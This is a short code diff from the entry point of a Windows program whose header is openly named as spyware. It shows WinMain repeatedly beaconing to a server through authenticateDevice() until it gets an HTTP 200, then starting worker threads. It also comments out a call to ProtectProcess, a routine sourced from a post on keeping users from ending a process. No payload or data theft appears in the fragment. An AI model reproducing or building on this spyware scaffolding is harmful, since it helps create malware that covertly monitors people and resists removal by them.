@@ -1,22 +1,19 @@
-#include <windows.h>
-#include <Aclapi.h>
-#include <map>
-#include "TaskManagement.h"
-#include "../Network/ApiOperations.h"
-#include "../Network/Connect.h"
-DWORD ProtectProcess(void);
+#include "Blackeagle-spyware.h"
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	srand((unsigned)time(NULL) * getpid());
+//	ProtectProcess();
 
-	ProtectProcess();
+  
 	while (authenticateDevice().dwStatusCode != 200) {
 		Sleep(SYNC_TIME);
 	};
+	 
 	runThreads();
-	return 0;
+	return 0; 
 }
+
 // https://stackoverflow.com/questions/6185975/prevent-user-process-from-being-killed-with-end-process-from-process-explorer
 DWORD ProtectProcess(void)
 {
